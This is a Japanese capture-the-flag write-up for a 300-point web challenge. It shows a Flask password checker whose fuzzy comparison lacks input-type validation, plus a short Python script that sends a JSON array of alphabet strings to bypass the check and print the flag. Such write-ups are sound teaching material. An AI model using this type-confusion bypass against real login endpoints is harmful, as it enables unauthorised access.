# password:Web:300pts
パスワードの文字が紛らわしいので、打ち間違えても通るようにしました。 [http://34.146.80.178:8001/](http://34.146.80.178:8001/)  
[password.zip](password.zip)  

# Solution
アクセスするとパスワードをチェックするサイトのようだ。  
flag form  
[site.png](site/site.png)  
ソースが配布されているので見ると以下のようであった。  
```python
~~~
password = "".join([secrets.choice(string.ascii_letters) for _ in range(32)])
~~~
def fuzzy_equal(input_pass, password):
	if len(input_pass) != len(password):
		return False

	for i in range(len(input_pass)):
		if input_pass[i] in "0oO":
			c = "0oO"
		elif input_pass[i] in "l1I":
			c = "l1I"
		else:
			c = input_pass[i]
		if all([ci != password[i] for ci in c]):
			return False
	return True
~~~
@app.route("/flag", methods=["POST"])
def search():
	if request.headers.get("Content-Type") != 'application/json':
		return make_response("Content-Type Not Allowed", 415)

	input_pass = request.json.get("pass", "")
	if not fuzzy_equal(input_pass, password):
		return make_response("invalid password", 401)
	return flag
~~~
```
パスワードはランダムのstring.ascii_lettersのようである。  
jsonで受け取り、`0oO`と`l1I`を曖昧にしているようだ。  
眺めると`all([ci != password[i] for ci in c])`が気にかかる。  
`input_pass[i]`が配列である場合、その中に`password[i]`と同じ文字が含まれていると容易に突破できる。  
`input_pass[i]`が`"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"`となるようなリクエストを投げればよい。  
以下のatoz.pyにて行う。  
```python:atoz.py
import json
import requests

url = "http://34.146.80.178:8001/flag"

data = {"pass":["abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"]*32}
headers = {"Content-Type":"application/json"}
response = requests.post(url, data=json.dumps(data), headers=headers)
print(response.text)
```
以下のように実行する。  
```bash
$ python atoz.py
nitic_ctf{s0_sh0u1d_va11dat3_j50n_sch3m3}
```
flagが得られた。  

## nitic_ctf{s0_sh0u1d_va11dat3_j50n_sch3m3}